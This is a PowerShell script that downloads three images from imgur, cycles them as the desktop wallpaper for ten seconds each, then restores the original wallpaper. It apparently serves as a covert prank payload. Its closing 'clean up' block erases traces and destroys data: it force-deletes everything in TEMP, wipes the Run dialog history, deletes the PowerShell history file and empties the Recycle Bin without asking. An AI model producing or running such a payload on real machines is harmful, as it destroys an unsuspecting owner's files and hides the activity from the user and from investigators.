$imageUrls = @(
    "https://i.imgur.com/EBxD6FK.png",
    "https://i.imgur.com/t1mBlY9.png",
    "https://i.imgur.com/EnmQMbo.png"
)

# Get the current wallpaper path and settings
$currentWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper
$wallpaperStyle = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle).WallpaperStyle
$tileWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper).TileWallpaper

Function Set-WallPaper {
param (
    [parameter(Mandatory=$True)]
    [string]$Image,
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style = 'Center'
)
 
$WallpaperStyle = Switch ($Style) {
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
}

If ($Style -eq "Tile") {
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
} Else {
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;

public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 

$SPI_SETDESKWALLPAPER = 0x0014
$UpdateIniFile = 0x01
$SendChangeEvent = 0x02

$fWinIni = $UpdateIniFile -bor $SendChangeEvent

$ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

# Download and set each image as wallpaper for 10 seconds
foreach ($imageUrl in $imageUrls) {
    $imagePath = "$env:TMP\$(Split-Path -Leaf $imageUrl)"
    Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
    Set-WallPaper -Image $imagePath -Style Center
    Start-Sleep -Seconds 10
}

# Revert to the original wallpaper
Set-WallPaper -Image $currentWallpaper -Style Center

# Restore the original wallpaper style and tile settings
New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $wallpaperStyle -Force
New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value $tileWallpaper -Force

# Clean up temporary files and history
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
